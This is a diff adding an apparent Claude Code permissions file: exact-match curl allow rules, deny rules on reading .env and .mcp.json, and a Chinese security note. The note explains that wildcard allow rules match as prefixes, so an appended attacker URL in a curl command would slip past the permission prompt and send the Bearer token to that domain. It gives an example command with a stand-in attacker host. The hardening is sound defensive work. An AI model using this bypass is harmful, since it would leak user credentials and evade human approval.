@@ -1,0 +1,47 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(curl -s https://unrefreshing-trudy-subsequently.ngrok-free.dev/mcp-admin-dev/health)",
+      "Bash(curl -s https://unrefreshing-trudy-subsequently.ngrok-free.dev/mcp-admin-pre/health)",
+      "Bash(curl -s https://unrefreshing-trudy-subsequently.ngrok-free.dev/mcp-admin-evi/health)",
+      "Bash(curl -s https://unrefreshing-trudy-subsequently.ngrok-free.dev/mcp-platform/health)",
+      "Bash(bash .claude/skills/login/login.sh)",
+      "Bash(bash .claude/skills/upload-image/upload.sh)"
+    ],
+    "deny": [
+      "Read(./.env)",
+      "Read(./.mcp.json)"
+    ],
+    "defaultMode": "default"
+  },
+  "_securityNote": [
+    "為什麼 allow 清單裡每一條都是完整逐字比對、沒有任何用 * 收尾的網域萬用字元規則",
+    "（例如刻意不寫成 Bash(curl https://<我方domain>/*)）：",
+    "",
+    "2026-08-19 實測驗證（curl 對本機 loopback 兩個不同 port 做的對照組，",
+    "細節見 H16 完成報告）：Claude Code 的 Bash permission allow 規則是純前綴比對，",
+    "* 會吃掉從它開始到指令字串結尾的『所有』內容，包含指令裡後面又出現的另一個",
+    "網址/主機。也就是說如果規則是『curl https://我方domain/*』，",
+    "『curl https://我方domain/x https://攻擊者domain/y』這種指令一樣會被規則",
+    "『匹配到』而直接放行、不會跳出權限確認——因為 curl 遇到多個網址參數時，",
+    "會把同一組 header／body（含 Bearer token）對每一個網址各發一次請求，",
+    "這代表萬用字元規則實際上等於幫攻擊者開了一條把 token 一起送到任意網域的路。",
+    "",
+    "相對地，完全不帶 * 的逐字規則有測試證實兩端都有錨定：指令只要多一個字元",
+    "（包含被硬塞一個攻擊者網址）就不再等於規則字串，match 失敗、必須跳權限提示，",
+    "不會被誤放行。",
+    "",
+    "後果：這份 allow 清單只能覆蓋『指令內容從頭到尾固定不變』的操作",
+    "（本檔目前只有不需要 token、無 request body 的 GET /health 健康檢查；",
+    "以及呼叫 H17/H18 兩支登入／上傳 skill 的『固定腳本呼叫』本身）。",
+    "H17／H18 兩支 skill 內部真正需要帶 token／帳密／檔案路徑等動態內容的 curl，",
+    "一定要包在一支不吃額外參數的固定 wrapper script 裡（agent 只呼叫",
+    "`bash .claude/skills/login/login.sh`／`bash .claude/skills/upload-image/upload.sh`",
+    "這兩個完全固定的指令字串，動態值由 script 內部自己從 .env／.mcp.json 讀），",
+    "不要讓 agent 自己在對話裡組出一行帶著 token 的 curl 指令——",
+    "那種指令本質上就沒有辦法用這裡的萬用字元語法安全地 allowlist。",
+    "",
+    "如果之後真的需要放寬（例如 skill 要支援可變路徑），先重新做一次同樣的",
+    "『兩個 host 對照組』實測，不要假設語法看起來合理就是安全的。"
+  ]
+}
